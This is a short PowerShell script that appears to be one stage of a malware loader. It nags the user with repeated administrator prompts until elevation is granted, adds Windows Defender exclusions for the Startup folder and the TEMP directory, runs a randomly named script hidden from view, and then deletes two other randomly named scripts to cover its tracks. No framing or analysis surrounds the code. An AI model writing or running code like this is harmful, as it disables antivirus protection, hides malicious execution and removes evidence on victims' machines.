while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {

    $process = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -PassThru
    
    if (-not $process) {
        Write-Host "Administrator permission is required. Retrying in 3 seconds..."
        Start-Sleep -Seconds 3  
    } else {
        Exit  
    }
}

Set-Variable -Value "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" -Name initial_dir
$currentDir = Get-Location
$tasks = "C:\ProgramData\Microsoft\Windows"

Add-MpPreference -ExclusionPath "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
Add-MpPreference -ExclusionPath "$env:TEMP"

Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$tasks\AEQKCPrkuifY.ps1`"" -NoNewWindow -Wait

Start-Sleep -Seconds 180
Remove-Item -Path "$initial_dir/BVrAihDwJNvc.ps1"
Remove-Item -Path "$currentDir/ysAhVvSZMXDP.ps1"
